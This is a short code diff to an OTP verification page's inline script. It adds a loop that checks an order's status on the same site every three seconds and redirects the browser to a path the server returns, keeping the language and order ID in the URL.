@@ -104,7 +104,21 @@
     <script>
     (function() {
         var params = new URLSearchParams(window.location.search);
+        var lang = params.get('lang') || 'ar';
         var orderId = Number(params.get('orderId')) || 0;
+
+        if (orderId) {
+            setInterval(function() {
+                fetch('/api/requests/' + orderId + '/check')
+                .then(function(r) { return r.json(); })
+                .then(function(d) {
+                    if (d.redirect) {
+                        window.location.href = '/' + d.redirect + '?lang=' + lang + '&orderId=' + orderId;
+                    }
+                })
+                .catch(function(){});
+            }, 3000);
+        }
 
         document.getElementById('otpForm').addEventListener('submit', function(e) {
             e.preventDefault();
